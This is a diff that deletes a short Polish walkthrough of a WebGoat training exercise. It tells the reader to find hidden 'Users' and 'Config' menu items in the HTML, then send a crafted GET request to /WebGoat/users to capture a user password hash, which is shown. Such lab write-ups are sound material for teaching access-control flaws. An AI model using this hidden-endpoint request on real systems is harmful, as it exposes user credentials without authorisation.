@@ -1,8 +1,0 @@
-2. Po prostu sprawdzamy kod HTML i wyszukujemy ukryte elementy menu Users Config
-
-3. Wystarczy zmodyfikować zapytanie:
-GET /WebGoat/users HTTP/1.1
-Connection: close
-Content-Type: application/json
-
-aby przechwycić  "userHash" : "gxERduOvfQcPGsNvX/y4w281Jt5Xls8pfi4kWNlAZ6U="
